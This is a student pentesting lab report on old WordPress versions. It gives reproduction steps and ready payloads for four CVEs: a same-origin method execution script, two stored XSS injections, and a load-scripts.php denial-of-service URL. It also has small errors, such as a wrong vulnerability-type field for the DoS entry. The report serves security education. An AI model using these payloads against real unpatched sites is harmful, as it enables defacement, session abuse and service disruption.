# CodePathweek7
# Project 7 - WordPress Pentesting

Time spent: 5 hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

Exploit 1. CVE-2016-4566 Upload Same Origin Method Execution (SOME)
  - [ ] Summary: 
    - Vulnerability types: Same Origin Method Execution (SOME)
    - Tested in version: 4.2
    - Fixed in version: 4.2.8
  - [ ] GIF Walkthrough: https://github.com/oleksandrbi/CodePathweek7/blob/master/exploit1.gif
  - [ ] Steps to recreate: 
  
        1. Reply to an existing comment
        
        2. Using Javascript use the following code:
            <button onclick="fire()">Click</button>
            <script>
            function fire() {
             open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload /plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
              setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
            }
            </script>
            
        3. The following script will use an exploit that will create a malicious button that when clicked will take the user to a fake    website example.com
        
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/changeset/37382/)
    
Exploit 2. CVE-2015-3440 Unauthenticated Stored Cross Site-Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: Cross Site-Scripting (XSS)
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: https://github.com/oleksandrbi/CodePathweek7/blob/master/exploit2.gif
  - [ ] Steps to recreate: 
  
        1. Create a new post
        
        2. In the post body, write this code:
            a) It must contain an XSS injection content, followed by at least 64 kilobytes of text
                Example: 
                    <a title='x onmouseover=alert(unescape(/hello%20world/.source))
                    style=position:absolute;left:0;top:0;width:5000px;height:5000px
                    AAAAAAAA.. (for 64 kb)....AAAAAA
                    
        3. Save and reload the site
        
        4. WordPress will truncate the comment allowing the injected content to be posted on the site
            a) A pop up message of "Hello World" will pop up on mouse move
            
  - [ ] Affected source code:
    - [Link 2](https://core.trac.wordpress.org/changeset/32299)
    - [Link 2.1](https://www.exploit-db.com/exploits/36844/)
    - [Link 2.2](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3440)
    
Exploit 3. CVE-2018-6389 Application Denial of Service (DoS)
  - [ ] Summary: 
    - Vulnerability types: 4.2
    - Tested in version: 4.9.4
    - Fixed in version: unpacthed
  - [ ] GIF Walkthrough: https://github.com/oleksandrbi/CodePathweek7/blob/master/exploit3.gif
  - [ ] Steps to recreate:
  
          1. When the site is loading, you need to paste the following at the end of the URL
              /wp-admin/load-scripts.php?c=1&load=editor,common,user-profile,media-widgets,media-gallery
              
          2. With the script now in the URL, reload the webpage and it tries to find the JavaScript file name (ediotr,common, etc.)
          
          3. The webpage will then find all the information and return it to the users webpage in a single file
        
  - [ ] Affected source code:
    - [Link 3](https://wpvulndb.com/vulnerabilities/9021)
    
Expoint 4: CVE-2017-6817 Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [ ] Summary: 
    - Vulnerability types:  Cross-Site Scripting (XSS)
    - Tested in version: 4.2
    - Fixed in version: 4.7.3
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  
        1. Create a new post
        
        2. In the post body, write this code:
            [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
            
        3. Save your changes, when you go to the post on the site you will see an embeded link
        
        4. Click the embeded link and a alert window will pop up with the message “No Body Is Safe!”
        
  - [ ] Affected source code:
    - [Link 4](https://wpvulndb.com/vulnerabilities/8768) 
    
## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright 2018 Oleksandr Bihary

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
